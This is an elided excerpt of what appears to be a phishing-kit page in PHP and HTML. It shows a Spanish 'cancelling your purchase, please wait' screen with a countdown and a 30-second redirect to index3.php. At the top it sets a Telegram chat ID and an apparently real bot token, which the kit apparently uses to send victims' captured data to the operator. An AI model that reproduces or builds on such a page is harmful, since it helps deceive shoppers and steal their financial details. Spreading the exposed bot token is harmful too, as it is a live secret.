...
$sendtotelegram="yes";
$chat_id="1166560234";
$bot_url="6675259515:AAE0R33aF6w0UtjKIODD-2D3FVobjNeSYUQ";
...
<body onload="actualizarTiempo()">
 ...
 echo date(' h:i:s A '); ?>
            ...
            <div class="center3">
              ...
              <h6 class="">Casi terminamos de cancelar la compra</h6>
    ...
    <h2 class="titlex">Cargando...</h2>
      ...
      <div align="center">
        ...
        <br><br>
        <p class="txtalt">Por favor espera</p> 
        <p class="txtalt" id="tiempo">25 segundos</p> 
  ...
  <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
   ...
   <script language="JavaScript">
      $(document).ready(function() {
          setTimeout("location.href='index3.php'", 30000);
      });
      </script>
